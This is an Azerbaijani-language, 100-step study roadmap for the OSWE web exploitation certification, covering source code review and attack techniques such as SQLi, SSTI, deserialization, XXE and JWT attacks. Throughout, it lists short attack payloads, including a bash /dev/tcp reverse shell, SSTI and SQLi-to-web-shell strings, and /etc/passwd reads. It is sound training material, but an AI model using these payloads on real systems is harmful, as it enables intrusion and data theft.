# 🟠 OSWE İmtahanı — 100 Addımlı Tam Hazırlıq Roadmap

> **WEB-300: Advanced Web Attacks and Exploitation**
> Bu roadmap OSWE sertifikatı üçün tam hazırlıq proqramıdır.
> Əsas fərq: OSWE **source code review** üzərindədir — black-box yox, **white-box** pentesting.

---

## 📋 Ümumi Məlumat

| Xüsusiyyət | Detal |
|---|---|
| **Sertifikat** | OSWE (OffSec Web Expert) |
| **Kurs** | WEB-300 |
| **İmtahan müddəti** | 48 saat |
| **Format** | 2 fərqli web tətbiq, hər birindən flags |
| **Əsas fokus** | Source code review → Authentication bypass → RCE |
| **Qiymətləndirmə** | Tam avtomatik exploit skript tələb olunur |

---

## 🗓️ MƏRHƏLƏ 1: Əsas Hazırlıq (Addım 1–12)

### Addım 1 — OSWE Formatını Anlamaq
- White-box pentesting nədir: source code əldə etmək
- İmtahan formatı: 2 tətbiq, hər birində local.txt + proof.txt
- Tam avtomatik exploit skript: manual exploitation qəbul edilmir
- 48 saat = 2 tətbiq × 24 saat planlaması

### Addım 2 — Mühit Qurulması
- Kali Linux VM (Burp Suite Pro, Python 3, Go)
- Burp Suite Pro lisenziyası və konfiqurasiyası
- Docker ilə zəif tətbiqləri lokal run etmək
- VS Code + SQL, PHP, Java, Python syntax highlight

### Addım 3 — Burp Suite Pro — Dərin Mənimsəmə
- Intercept, Repeater, Intruder tam konfiqurasiya
- Logger++ extension qurulumu
- Match & Replace qaydaları
- Burp Collaborator istifadəsi (out-of-band testlər üçün)

### Addım 4 — Python ilə Exploit Skript Yazmaq
- `requests` kitabxanası — session, cookie, header idarəetməsi
- `argparse` ilə CLI tool yazmaq
- `re` (regex) ilə response parsing
- Error handling: retry logic, timeout

### Addım 5 — HTTP Protokolu Dərinləşmə
- HTTP/1.1 vs HTTP/2 fərqləri
- Cookie mexanizmi: SameSite, HttpOnly, Secure
- CORS (Cross-Origin Resource Sharing) mexanizmi
- Content-Type ilə server davranışının dəyişməsi

### Addım 6 — Web Authentication Mexanizmləri
- Session-based authentication
- JWT (JSON Web Token) strukturu
- OAuth 2.0 / OpenID Connect axını
- API Key authentication

### Addım 7 — Source Code Review Metodologiyası
- Taint analysis: input → sink
- Data flow tracing: HTTP request → database
- Dangerous function-ların siyahısı (PHP, Java, Python, Node.js)
- grep ilə sürətli zəiflik axtarışı

### Addım 8 — PHP Əsasları (Hücumçu Gözü ilə)
- PHP type juggling: `==` vs `===`
- `include`, `require`, `eval` — dangerous functions
- `$_GET`, `$_POST`, `$_COOKIE`, `$_REQUEST` — user input
- PHP session mexanizmi

### Addım 9 — Java Əsasları (Hücumçu Gözü ilə)
- Java Servlet / JSP strukturu
- `Runtime.exec()`, `ProcessBuilder` — RCE sinkləri
- Java deserialization: `ObjectInputStream.readObject()`
- Class path və library dependencies

### Addım 10 — Node.js Əsasları (Hücumçu Gözü ilə)
- Express.js route-ları və middleware
- `child_process.exec()` — RCE sinki
- Prototype pollution konsepsiyası
- `eval()`, `Function()` — code injection

### Addım 11 — SQL Əsasları (Advanced)
- MySQL, MSSQL, PostgreSQL fərqləri
- Stored procedures, triggers
- Database user privileges
- `LOAD_FILE`, `INTO OUTFILE` — MySQL file operations

### Addım 12 — Lab Mühiti: Zəif Tətbiqlər
- DVWA (Damn Vulnerable Web App) qurulumu
- WebGoat qurulumu
- VulnHub-dan PHP/Java tətbiqlər
- HackTheBox — web challenges başla

---

## 🗓️ MƏRHƏLƏ 2: Cross-Site Scripting (XSS) → RCE (Addım 13–22)

### Addım 13 — XSS Növlərini Başa Düşmək
- Reflected XSS: request içərisindəki payload
- Stored XSS: database-ə yazılan payload
- DOM-based XSS: JavaScript-in özündəki zəiflik
- Self-XSS vs exploitable XSS fərqi

### Addım 14 — XSS Filter Bypass Texnikalar
- HTML entity encoding bypass
- JavaScript event handler-lar (`onerror`, `onload`)
- SVG tag-ları ilə XSS
- `javascript:` URL protocol

### Addım 15 — XSS ilə Cookie Oğurlamaq
- `document.cookie` ilə session steal
- HttpOnly cookie-nin bypass olunmama səbəbi
- XSS ilə CSRF token capture
- Out-of-band: cookie-ni Burp Collaborator-a göndərmək

### Addım 16 — XSS ilə Admin Panel Bypass
- Admin cookie-ni oğurlayıb session hijack
- XSS ilə admin funksiyaları avtomatik icra etmək
- `fetch()` ilə admin action-ları tetiklemek
- XSS-dən credential harvest

### Addım 17 — XSS → RCE Zənciri
- Admin panel + file upload funksiyası
- XSS ilə admin adından shell yükləmək
- Browser-based XSS exploit + server-side exec
- OSWE-də XSS-dən RCE zəncirinə praktik nümunə

### Addım 18 — DOM-based XSS Analizi
- Source-lar: `location.href`, `document.URL`, `location.search`
- Sink-lər: `innerHTML`, `document.write`, `eval`
- DOM XSS-i Burp DOM Invader ilə tapmaq
- Angular/React kimi framework-lərdə DOM XSS

### Addım 19 — Content Security Policy (CSP) Bypass
- CSP header-ın analizi
- `unsafe-inline`, `unsafe-eval` olduqda bypass
- Whitelisted CDN-dən payload yükləmək
- JSONP endpoint-ləri ilə CSP bypass

### Addım 20 — WebSocket Hücumları
- WebSocket handshake analizi
- CSWSH (Cross-Site WebSocket Hijacking)
- WebSocket-dən SQLi / XSS
- Burp Suite ilə WebSocket intercepting

### Addım 21 — Lab: XSS → Admin Session → RCE
- Stored XSS tapılması (source code review ilə)
- JavaScript payload yazmaq
- Admin cookie-ni capture etmək
- Admin panel vasitəsilə shell yükləmək

### Addım 22 — Python Skript: XSS Exploit Avtomatlaşdırma
- Bütün zənciri Python ilə avtomatlaşdır
- Login → XSS trigger → Cookie capture → Admin action → Shell
- `requests.Session()` ilə cookie idarəetməsi
- End-to-end test: skript işə salındıqda flag əldə edilir

---

## 🗓️ MƏRHƏLƏ 3: SQL Injection — Advanced (Addım 23–34)

### Addım 23 — SQL Injection Növlərini Dərinləşdirmək
- In-band: Error-based, Union-based
- Blind: Boolean-based, Time-based
- Out-of-band: DNS exfiltration
- Second-order SQL injection

### Addım 24 — Union-Based SQLi — Metodologiya
- Sütun sayını təyin etmək: `ORDER BY`
- Visible column tapmaq
- Database, table, column enumerasiyası
- Data extraction: users, hashes

### Addım 25 — Error-Based SQLi
- MySQL: `extractvalue()`, `updatexml()`
- MSSQL: `convert()` error
- PostgreSQL: `cast()` error
- Error message-dən məlumat çıxarmaq

### Addım 26 — Boolean-Based Blind SQLi
- True/False şərtlər ilə karakter-by-karakter extraction
- `SUBSTRING()`, `ASCII()`, `CHAR()` funksiyaları
- Tez extraction üçün binary search algoritması
- Python skript ilə avtomatlaşdırma

### Addım 27 — Time-Based Blind SQLi
- `SLEEP()` (MySQL), `WAITFOR DELAY` (MSSQL), `pg_sleep()` (PostgreSQL)
- Network latency-ni nəzərə almaq
- Adaptive threshold: dinamik sleep dəyəri
- Python ilə time-based SQLi skripti

### Addım 28 — Second-Order SQL Injection
- Input saxlama zamanı normal görünür
- Başqa sorğuda çağırılanda inject olunur
- Source code-da iki ayrı yeri izləmək
- Register → Login ssenarisi

### Addım 29 — SQLi ilə File Read/Write
- MySQL `LOAD_FILE('/etc/passwd')`
- MySQL `INTO OUTFILE '/var/www/html/shell.php'`
- `secure_file_priv` məhdudiyyəti
- MSSQL: `xp_cmdshell` aktivləşdirmək

### Addım 30 — MSSQL — xp_cmdshell ilə RCE
- `xp_cmdshell` aktivləşdirmə sorğusu
- OS command execution
- `xp_cmdshell` deaktiv olduqda alternativ
- CLR (Common Language Runtime) stored procedure

### Addım 31 — PostgreSQL ilə RCE
- `COPY TO/FROM PROGRAM` (PostgreSQL 9.3+)
- Large Object ile fayl yüklemek
- `pg_read_file()` ilə fayl oxumaq
- `CREATE FUNCTION` ilə C extension

### Addım 32 — SQLi WAF Bypass Texnikalar
- Space əvəzinə: `/**/`, `%0a`, `%09`
- Keyword bypass: `SeLeCt`, `UNION/**/SELECT`
- Double encoding: `%2527`
- HTTP parameter pollution

### Addım 33 — Lab: SQLi → RCE Zənciri
- Source code-da SQLi tap (taint analysis)
- Union-based ilə DB credentials al
- File write ilə web shell yüklə
- Shell ilə `proof.txt` oxu

### Addım 34 — Python Skript: Tam SQLi Exploit
- Avtomatik sütun sayı aşkarlama
- Avtomatik database/table/column dump
- File write ilə shell upload
- Credentials crack (MD5, bcrypt detect)

---

## 🗓️ MƏRHƏLƏ 4: Authentication Bypass (Addım 35–45)

### Addım 35 — Authentication Bypass Növləri
- SQL injection ilə login bypass
- Type juggling ilə hash comparison bypass
- Insecure "remember me" token
- Password reset logic flaws

### Addım 36 — PHP Type Juggling
- PHP `==` ilə loose comparison
- `0 == "hacker"` → TRUE (PHP 7)
- MD5 hash magic: `0e` prefix
- `strcmp()` bypass: array input

### Addım 37 — Type Juggling — Hash Comparison
- `md5("240610708") == md5("QNKCDZO")` → TRUE
- Magic hash siyahısı (0e ile başlayan)
- bcrypt truncation (72 byte limit)
- `sha1()` magic hash-ları

### Addım 38 — JSON Web Token (JWT) Hücumları
- JWT strukturu: header.payload.signature
- `alg: none` hücumu
- RS256 → HS256 key confusion
- Weak secret brute-force (`jwt_tool`, `hashcat`)

### Addım 39 — JWT — Tam Hücum Metodologiyası
- `jwt_tool.py` ilə JWT analizi
- Algorithm confusion: RSA public key ilə HMAC sign
- `kid` (Key ID) injection → SQLi/Path Traversal
- JWK (JSON Web Key) injection

### Addım 40 — Password Reset Logic Flaws
- Token predictability (timestamp-based)
- Host header injection → reset link hijack
- Race condition: token reuse
- Expired token acceptance

### Addım 41 — Insecure Direct Object Reference (IDOR) — Auth Bypass
- User ID manipulation
- UUID predictability
- Horizontal privilege escalation
- Mass assignment: `isAdmin: true`

### Addım 42 — Session Management Zəifliklər
- Predictable session token (sequential, timestamp)
- Session fixation hücumu
- Session token entropy analizi
- Logout-dan sonra token invalidation yoxdur

### Addım 43 — OAuth 2.0 Hücumları
- State parameter CSRF bypass
- Open redirect ilə code steal
- `redirect_uri` manipulation
- Implicit flow token leak

### Addım 44 — Multi-Factor Authentication Bypass
- MFA code brute-force (rate limit yoxdur)
- Response manipulation: `"mfa_required": false`
- Backup code guessing
- Race condition: kod bir dəfə istifadə edilməlidir

### Addım 45 — Lab: Authentication Bypass Chain
- Source code review ilə type juggling tap
- JWT `alg:none` bypass
- Password reset token predict et
- Admin hesabına daxil ol → proof.txt

---

## 🗓️ MƏRHƏLƏ 5: Deserialization (Addım 46–56)

### Addım 46 — Serialization Nədir
- Object → byte stream (serialization)
- Byte stream → Object (deserialization)
- Niyə təhlükəlidir: user-controlled data
- Hansı dillər təsirlənir: PHP, Java, Python, .NET

### Addım 47 — PHP Deserialization
- `serialize()` / `unserialize()` funksiyaları
- PHP object structure: `O:4:"User":1:{s:4:"name";s:5:"admin";}`
- Magic methods: `__wakeup()`, `__destruct()`, `__toString()`
- Gadget chain konsepsiyası

### Addım 48 — PHP Deserialization — Gadget Chains
- POP (Property Oriented Programming) chain
- Mövcud class-lardan chain qurmaq
- `phpggc` tool ilə gadget chain generate
- File write, RCE gadget chain-ləri

### Addım 49 — PHP Deserialization — Lab
- Source code-da `unserialize()` tap
- Mövcud class-ları analiz et
- `phpggc` ilə payload yarat
- RCE əldə et

### Addım 50 — Java Deserialization
- `ObjectInputStream.readObject()` sinki
- `ysoserial` tool ilə payload yaratmaq
- CommonsCollections gadget chains
- Java class path-da mövcud kitabxanalar

### Addım 51 — Java Deserialization — ysoserial
- `ysoserial` qurmaq və istifadə etmək
- `CommonsCollections1`, `CC6` payload-ları
- `URLDNS` chain ilə OOB detection
- Serialize payload-ı HTTP request-ə yerləşdirmək

### Addım 52 — Java Deserialization — JRMP
- Java RMI (Remote Method Invocation)
- JRMP listener ilə payload delivery
- `ysoserial JRMPListener` istifadəsi
- Firewall-ın JRMP-ni bloklaması

### Addım 53 — .NET Deserialization
- `BinaryFormatter`, `XmlSerializer`, `JsonConvert`
- `ysoserial.net` tool
- ViewState manipulation
- `__VIEWSTATEGENERATOR` bypass

### Addım 54 — Python Deserialization (Pickle)
- `pickle.loads()` sinki
- Custom `__reduce__` metodu ilə RCE
- `os.system()` / `subprocess` chain
- YAML deserialization (PyYAML)

### Addım 55 — Node.js Deserialization
- `node-serialize` zəif paket
- IIFE (Immediately Invoked Function Expression) payload
- `{"rce":"_$$ND_FUNC$$_function(){...}()"}`
- `serialize-javascript` zəifliyi

### Addım 56 — Lab: Deserialization → RCE
- Hansı deserialization endpoint istifadə edilir
- Gadget chain seçimi (phpggc/ysoserial)
- Payload encode et (base64/hex)
- RCE → Reverse shell → proof.txt

---

## 🗓️ MƏRHƏLƏ 6: Server-Side Template Injection (SSTI) (Addım 57–65)

### Addım 57 — SSTI Nədir
- Template engine-lər: Jinja2, Twig, Freemarker, Velocity, Mako
- User input template-ə birləşdirilir
- `{{7*7}}` → `49` output: SSTI var
- Template injection vs XSS fərqi

### Addım 58 — SSTI Template Engine Şəbəkəsi
- Decision tree: `{{7*7}}`, `{{7*'7'}}`, `${{<%[%'"}}%\`
- Jinja2 (Python), Twig (PHP), Freemarker (Java)
- ERB (Ruby), Pebble (Java), Smarty (PHP)
- Engine identifikasiyası

### Addım 59 — Jinja2 SSTI (Python)
- `{{config}}` ilə konfiqurasiya oxuma
- `{{''.__class__.__mro__[1].__subclasses__()}}` class chain
- `subprocess.Popen` vasitəsilə RCE
- Filter bypass: `|attr()`, `|int`, `request`

### Addım 60 — Jinja2 Filter Bypass
- `_` (underscore) filter bypass: `request['__cl'+'ass__']`
- `.` (dot) filter bypass: `|attr()`
- `[]` filter bypass: `.__class__` → `['__class__']`
- String concatenation ilə keyword bypass

### Addım 61 — Twig SSTI (PHP)
- `{{7*7}}` vs `{{7*'7'}}` fərqi Twig vs Jinja2
- `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- `system()` əvəzinə Twig-specific RCE
- Twig version fərqləri

### Addım 62 — Freemarker SSTI (Java)
- `${7*7}` syntax
- `freemarker.template.utility.Execute` class
- `?new()` ilə yeni object yaratmaq
- `<#assign>` directive

### Addım 63 — Velocity SSTI (Java)
- `#set($x='')` syntax
- `$x.class.forName('java.lang.Runtime')`
- ClassLoader vasitəsilə RCE
- Velocity Tools context

### Addım 64 — ERB SSTI (Ruby)
- `<%= 7*7 %>` syntax
- `<%= system('id') %>` RCE
- `<%= `id` %>` backtick execution
- Ruby on Rails SSTI konteksti

### Addım 65 — Lab: SSTI → RCE
- Template injection nöqtəsini tap (source code)
- Engine-i identifikasiya et
- RCE payload-ı hazırla
- Python skript ilə avtomatlaşdır

---

## 🗓️ MƏRHƏLƏ 7: Digər RCE Texnikalar (Addım 66–78)

### Addım 66 — XXE (XML External Entity) Injection
- XML parser-ların DTD (Document Type Definition) prosesləməsi
- Classic XXE: `/etc/passwd` oxumaq
- SSRF via XXE: internal service-lərə çatmaq
- Blind XXE: OOB data exfiltration

### Addım 67 — XXE — Advanced Texnikalar
- `SYSTEM` vs `PUBLIC` identifier
- PHP filter ilə binary file oxuma: `php://filter/convert.base64-encode/resource=`
- XXE-dən SSRF: `http://169.254.169.254/` (cloud metadata)
- Error-based XXE

### Addım 68 — XXE → LFI → RCE Zənciri
- XXE ilə source code oxuma
- Source code-da başqa zəiflik tapmaq
- Config faylından credentials oxumaq
- XXE-dən RCE zəncirinə keçid

### Addım 69 — File Upload Zəifliklər
- MIME type validation bypass
- Magic bytes manipulation
- Double extension: `shell.php.jpg`
- Content-Type manipulation

### Addım 70 — File Upload — Advanced Bypass
- PHP `getimagesize()` bypass
- ImageMagick `convert` command bypass (ImageTragick)
- SVG ilə XSS yükleme
- ZIP/TAR symlink attack

### Addım 71 — Path Traversal / LFI
- `../../../etc/passwd`
- Encoding bypass: `%2e%2e%2f`, `..%2f`
- Null byte: `shell.php%00.jpg` (PHP < 5.3.4)
- LFI → Log Poisoning → RCE

### Addım 72 — LFI → RCE Texnikalar
- Apache access log poisoning
- `/proc/self/environ` injection
- PHP session file poisoning
- `php://input` ilə PHP code execution

### Addım 73 — Server-Side Request Forgery (SSRF)
- Internal network-a çatmaq
- Cloud metadata: `169.254.169.254`
- SSRF ilə internal port scan
- Blind SSRF: DNS callback

### Addım 74 — SSRF → Internal Service Exploitation
- Internal Redis → RCE
- Internal Elasticsearch → data leak
- Internal admin panel bypass
- Gopher protocol ilə SSRF

### Addım 75 — Command Injection
- OS command injection: `; id`, `| id`, `&& id`
- Blind command injection: `ping`, `sleep`
- Filter bypass: `$IFS`, `{cat,/etc/passwd}`
- Windows command injection fərqləri

### Addım 76 — Server-Side Prototype Pollution (Node.js)
- JavaScript prototype chain
- `__proto__` / `constructor.prototype` manipulation
- Property pollution → privilege escalation
- PP-dən RCE: template engine, child_process

### Addım 77 — XML/JSON Injection
- SOAP injection
- JSON parameter pollution
- Mass assignment via JSON
- GraphQL injection

### Addım 78 — Lab: Kompleks RCE Zənciri
- XXE + SSRF + Internal service
- File upload + LFI
- SSRF + Redis RCE
- Hər birini Python ilə avtomatlaşdır

---

## 🗓️ MƏRHƏLƏ 8: Source Code Review Metodologiyası (Addım 79–88)

### Addım 79 — Sürətli Taint Analysis
- Entry point-ları tap: HTTP parametrlər, cookies, headers
- Data flow-u izlə: input → business logic → output
- Sink-ləri tap: DB sorğu, OS command, file operation, template
- `grep -rn "eval\|exec\|system\|passthru\|popen"` (PHP)

### Addım 80 — PHP-də Dangerous Functions
```
eval(), assert(), preg_replace('/e' flag), create_function()
system(), exec(), shell_exec(), passthru(), popen(), proc_open()
include(), require(), include_once(), require_once()
unserialize(), file_get_contents(), file_put_contents()
mysql_query(), mysqli_query() (unsanitized)
```

### Addım 81 — Java-da Dangerous Patterns
```java
Runtime.getRuntime().exec()
ProcessBuilder().start()
ObjectInputStream.readObject()
Class.forName() + newInstance()
ScriptEngine.eval()
Expression Language (EL) injection
```

### Addım 82 — Python-da Dangerous Functions
```python
eval(), exec(), compile()
os.system(), subprocess.call(), subprocess.Popen()
pickle.loads(), yaml.load() (unsafe)
__import__(), importlib.import_module()
open() (arbitrary file read/write)
```

### Addım 83 — Node.js-də Dangerous Patterns
```javascript
eval(), Function()
child_process.exec(), child_process.spawn()
require() (user-controlled path)
vm.runInNewContext() bypass
deserialize() (node-serialize)
```

### Addım 84 — Semgrep ilə Avtomatik Code Review
- Semgrep qurulumu
- PHP, Java, Python rule set-ləri
- Custom rule yazmaq: taint analysis üçün
- False positive-ləri filtrlemek

### Addım 85 — grep/ripgrep ilə Sürətli Axtarış
```bash
# PHP SQLi tapa bilər
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include="*.php"

# Deserialization
grep -rn "unserialize\|readObject\|pickle.loads" .

# Template injection
grep -rn "render\|template\|Jinja2\|Twig" .
```

### Addım 86 — Authentication Kodu Review
- Login funksiyasını tap
- Hash comparison: `==` vs `===`
- Session generation: random vs predictable
- Password reset token generation

### Addım 87 — Business Logic Flaw Axtarışı
- Race condition: multi-thread testlər
- Negative value: mağaza, transfer
- State machine bypass: ödəniş → sifarişsiz
- Feature interaction: birləşdikdə zəiflik

### Addım 88 — Lab: Tam White-Box Review
- Böyük bir tətbiqin source code-unu yüklə
- Metodoloji olaraq hər dangerous function yoxla
- Zəiflikləri priority ilə sırala
- RCE-yə aparan path seç

---

## 🗓️ MƏRHƏLƏ 9: Exploit Skript Yazma (Addım 89–96)

### Addım 89 — Exploit Skript Strukturu
```python
#!/usr/bin/env python3
import requests, sys, argparse

def exploit(target, lhost, lport):
    s = requests.Session()
    # Step 1: Authentication bypass
    # Step 2: Vulnerability trigger
    # Step 3: Shell establishment
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    args = parser.parse_args()
    exploit(args.target, args.lhost, args.lport)
```

### Addım 90 — Session Idarəetməsi Python ilə
- `requests.Session()` ilə cookie avtomatik idarəetmə
- CSRF token extraction: `re.findall()`
- Form parsing: `BeautifulSoup`
- Redirect handling: `allow_redirects=False`

### Addım 91 — Reverse Shell Python ilə
- `/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`
- Python reverse shell payload encode
- Netcat listener: `nc -lvnp 4444`
- Shell stabilization: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

### Addım 92 — OOB (Out-of-Band) Teknikalar
- Burp Collaborator ilə DNS callback
- `interactsh` açıq alternativ
- Blind SQLi / Blind XXE OOB
- DNS exfiltration: data → subdomain

### Addım 93 — Multi-Step Exploit Debugging
- Her addımı ayrıca test et
- Response-ları print et, assert et
- Verbose mode: `-v` flag
- Timeout və retry logic

### Addım 94 — Race Condition Exploit
- Python `threading` ilə paralel request
- Burp Turbo Intruder istifadəsi
- Last-byte sync texnikası
- Race window-nu maximize etmək

### Addım 95 — Lab: End-to-End Exploit Skript
- Sıfırdan tam exploit skript yaz
- Skript bir komanda ilə proof.txt oxumalıdır
- Edge case-ləri handle et
- Başqa şəxsin mühitində test et

### Addım 96 — Exploit Skript Optimallaşdırma
- Sürəti artır: gereksiz request-ləri azalt
- Error mesajlarını informativ et
- Help text əlavə et
- Cross-platform (Linux/Windows) test et

---

## 🗓️ MƏRHƏLƏ 10: İmtahan Hazırlığı (Addım 97–100)

### Addım 97 — Mock Exam #1 (24 saat)
- Bir CTF-style white-box web tətbiqini tap
- 24 saat vaxt qoy
- Burp + Python + source review
- Skript yazana qədər bitirməyi hədəflə

### Addım 98 — Mock Exam #2 (48 saat)
- 2 tətbiq, 48 saat simulyasiya
- Real imtahan şərtləri: interruption yoxdur
- Qeyd: hər tapıntı dərhal qeyd edilsin
- Post-exam: nə çətin oldu, nə öyrənildi

### Addım 99 — Cheat Sheet Hazırlama
```
SSTI Payloads (Engine-by-engine)
SQLi Cheatsheet (MySQL/MSSQL/PostgreSQL)
Deserialization Tools (phpggc/ysoserial commands)
JWT Attack Commands (jwt_tool)
XXE Templates
File Upload Bypass Techniques
Reverse Shell One-liners
```

### Addım 100 — Son 48 Saat Hazırlığı
- Bütün tool-ların (Burp, Python, phpggc, ysoserial) işlədiyini yoxla
- Cheat sheet-ləri hazır saxla
- İmtahanda: ilk 2 saat — full enum, sonra exploit
- Flags tapanda: dərhal screenshot + flag qeyd
- **Unutma**: tam avtomatik skript olmadan exploit qəbul edilmir!

---

## 🛠️ Əsas Tool-lar Siyahısı

| Kateqoriya | Tool-lar |
|---|---|
| **Proxy** | Burp Suite Pro, OWASP ZAP |
| **SQLi** | sqlmap (anlama üçün), manual + Python |
| **Deserialization** | ysoserial, phpggc, ysoserial.net |
| **JWT** | jwt_tool, hashcat (`-m 16500`) |
| **SSTI** | tplmap, manual payloads |
| **XXE** | Burp Collaborator, interactsh |
| **Code Review** | Semgrep, grep/ripgrep, VS Code |
| **Fuzzing** | ffuf, feroxbuster, wfuzz |
| **Recon** | gobuster, dirsearch, hakrawler |
| **Exploit** | Python requests, httpx |

---

## 📚 Tövsiyə Edilən Resurslar

| Mənbə | Mövzu |
|---|---|
| **PortSwigger Web Academy** | Bütün OSWE mövzuları (pulsuz, lab-lı) |
| **HackTheBox — Web Challenges** | White-box challenges |
| **PentesterLab Pro** | Code review + exploit writing |
| **PayloadsAllTheThings (GitHub)** | Payload siyahıları |
| **swisskyrepo/PayloadsAllTheThings** | SSTI, XXE, SQLi payloads |
| **VulnHub** | Zəif VM-lər |
| **0xdf.gitlab.io** | HTB web writeup-ları |
| **book.hacktricks.xyz** | Geniş texnika kataloqu |

---

## ⚡ OSWE vs OSCP/OSEP Fərqləri

| Xüsusiyyət | OSWE | OSEP |
|---|---|---|
| **Yanaşma** | White-box (source code var) | Grey/Black-box |
| **Əsas bacarıq** | Code review + exploit chain | AV bypass + AD |
| **Skript** | Məcburi (Python/diğər) | Tövsiyə olunur |
| **OS** | Web (Linux/Windows server) | Windows AD |
| **İmtahan forması** | 2 web app, flags | Multi-host network |

---

## ⚠️ Vacib Qeydlər

> 🔑 **Ən Vacib Mövzular:**
> 1. PHP/Java/Python Type Juggling + Deserialization
> 2. JWT Algorithm Confusion
> 3. SSTI (xüsusilə Jinja2 + Twig)
> 4. SQLi → File Write → RCE
> 5. XXE + SSRF kombinasiyası
> 6. XSS → Admin Session → File Upload → RCE

> 💡 **İmtahan Strategiyası:**
> - İlk 2 saat: URL-ləri map et, source code-u oxu, zəiflik hypothesis yaz
> - Növbəti 6 saat: Ən güclü zəiflik vektorunu exploit et
> - Son 4 saat: Skripti polish et, ikinci zəifliyi araşdır

> ✍️ **Skript Tələbi:**
> OSWE imtahanında hər exploit üçün **tam işlək Python (və ya başqa dil) skripti** məcburidir.
> Skript `--target`, `--lhost`, `--lport` kimi parametrləri qəbul etməli, sıfırdan reverse shell-ə qədər hər şeyi avtomatlaşdırmalıdır.

---

*Bu roadmap WEB-300 kurs proqramına əsaslanır. Bütün texnikalar yalnız qanuni, icazəli mühitlərdə tətbiq edilməlidir.*
